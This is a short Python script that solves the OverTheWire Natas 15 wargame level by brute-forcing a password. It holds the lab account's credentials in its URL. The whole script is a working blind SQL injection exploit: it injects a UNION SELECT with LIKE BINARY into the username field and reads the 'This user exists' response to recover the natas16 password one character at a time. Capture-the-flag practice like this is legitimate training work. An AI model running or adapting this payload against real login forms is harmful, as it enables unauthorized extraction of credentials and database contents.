# Brute forces Natas 15 challenge to retrieve key

import requests, string

url = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'

password = ""
last_password_length = -1
while (last_password_length != len(password)):
    last_password_length = len(password)
    for current_guess in (string.ascii_letters + string.digits):
        myobj = {'username': '" UNION SELECT * from users where username="natas16" AND password LIKE BINARY "' + password + current_guess + '%'}
        x = requests.post(url, data = myobj)
        if "This user exists" in x.text:
            print(f"Password Char({len(password)}) is {current_guess}.")
            password += current_guess
            break
print(f"Password is: {password}")